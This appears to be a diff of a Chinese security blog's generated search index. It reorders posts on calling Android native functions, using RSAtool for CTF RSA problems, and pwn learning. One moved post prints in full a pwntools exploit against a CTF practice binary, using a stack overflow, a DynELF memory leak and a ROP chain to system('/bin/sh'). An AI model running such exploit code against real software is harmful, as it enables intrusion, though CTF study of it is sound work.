@@ -4,11 +4,11 @@
     <title>Android强调native函数的两种方法</title>
     <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
-<p>#通过导出函数调用native函数<br>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
-<p>##寻找导出函数<br>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
+<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
+<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
 <p>接下来在so中导出函数中该native函数</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
-<p>##编写Android APP<br>自己写一个带按钮的APP，调用该函数</p>
+<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
 <pre><code>public class MainActivity extends Activity 
 {
     public Button button;
@@ -71,9 +71,10 @@
 {
     private static native String aesEncode(String str, String str2);
 }
-</code></pre><p>##jni配置<br>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
-<p>###Android.mk<br>    LOCAL_PATH := $(call my-dir)</p>
-<pre><code>include $(CLEAR_VARS)
+</code></pre><h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
+<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><pre><code>LOCAL_PATH := $(call my-dir)
+
+include $(CLEAR_VARS)
 LOCAL_MODULE := Aes
 LOCAL_SRC_FILES := libAes.so
 include $(PREBUILT_SHARED_LIBRARY)
@@ -87,49 +88,15 @@ include $(CLEAR_VARS)
 LOCAL_MODULE    := my_objectname
 LOCAL_SRC_FILES := my_objectname.cpp
 include $(BUILD_SHARED_LIBRARY)
-</code></pre><p>###Application.mk<br>    APP_ABI := armeabi-v7a</p>
-<p>###my_objectname.app<br>里面写#include<jni.h>即可</jni.h></p>
+</code></pre><h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><pre><code>APP_ABI := armeabi-v7a
+</code></pre><h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
 <p>最后将APP安装到手机上运行即可输出调用结果</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
-<p>#通过函数地址调用native函数</p>
-]]></content>
+<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1>]]></content>
       <tags>
         <tag>Android</tag>
         <tag>Tools</tag>
         <tag>eclipse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RSAtool使用方法</title>
-    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
-<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
-<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
-已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
-(N=322831561921859 e = 23)
-请解密出明文，提交时请将数字转化为ascii码提交
-比如你解出的明文是0x6162，那么请提交字符串ab
-提交格式:PCTF{明文字符串}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
-<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
-<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
-<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
-<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
-<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
-p = 3487583947589437589237958723892346254777 
-q = 8767867843568934765983476584376578389
-e = 65537
-求d = 
-请提交PCTF{d}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
-<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-        <tag>工具</tag>
-        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -196,6 +163,39 @@ p.interactive()
       <tags>
         <tag>ctf</tag>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSAtool使用方法</title>
+    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
+<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
+<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
+已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
+(N=322831561921859 e = 23)
+请解密出明文，提交时请将数字转化为ascii码提交
+比如你解出的明文是0x6162，那么请提交字符串ab
+提交格式:PCTF{明文字符串}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
+<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
+<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
+<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
+<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
+<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
+p = 3487583947589437589237958723892346254777 
+q = 8767867843568934765983476584376578389
+e = 65537
+求d = 
+请提交PCTF{d}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
+<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+        <tag>工具</tag>
+        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -615,8 +615,8 @@ io.sendline(payload)
 io.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>writeup</tag>
         <tag>pwn</tag>
+        <tag>writeup</tag>
         <tag>漏洞</tag>
       </tags>
   </entry>
@@ -829,8 +829,8 @@ r.sendline(payload)
 r.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>writeup</tag>
         <tag>pwn</tag>
+        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -1256,71 +1256,6 @@ p.send(payload3)
       </tags>
   </entry>
   <entry>
-    <title>pwn学习之DynELF的使用</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwn学习rop之x86篇</title>
     <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
     <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
@@ -1480,6 +1415,71 @@ p.send(payload2)
 p.interactive()
 </code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习之DynELF的使用</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
+<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
+<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
+<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
+<pre><code>da$ disassemble vlun_fun 
+Dump of assembler code for function vlun_fun:
+   0x0804844d &lt;+0&gt;:    push   ebp
+   0x0804844e &lt;+1&gt;:    mov    ebp,esp
+   0x08048450 &lt;+3&gt;:    sub    esp,0x98
+   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
+   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
+   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
+   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
+   0x08048474 &lt;+39&gt;:    leave  
+   0x08048475 &lt;+40&gt;:    ret    
+</code></pre><p>和明显地址是0x0804844d</p>
+<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+elf = ELF(&apos;./test2&apos;)
+plt_write = elf.symbols[&apos;write&apos;]
+plt_read = elf.symbols[&apos;read&apos;]
+vulfun_addr = 0x0804844d
+
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+    return data
+p = process(&apos;./test2&apos;)
+gdb.attach(p,&quot;b *0x804850d&quot;)
+#p = remote(&apos;127.0.0.1&apos;, 10002)
+d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;system_addr=&quot; + hex(system_addr)
+bss_addr = 0x0804a024
+pppr = 0x804850d
+payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
+payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+payload2 += &apos;C&apos; * (256 - len(payload2))
+#ss = raw_input()
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+p.send(&quot;/bin/sh\0&quot;)
+p.interactive()
+</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
 ]]></content>
       <tags>
         <tag>pwn</tag>
@@ -2814,8 +2814,8 @@ name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apo
 <p>这样就解密了。。。</p>
 ]]></content>
       <tags>
-        <tag>工具</tag>
         <tag>ctf</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
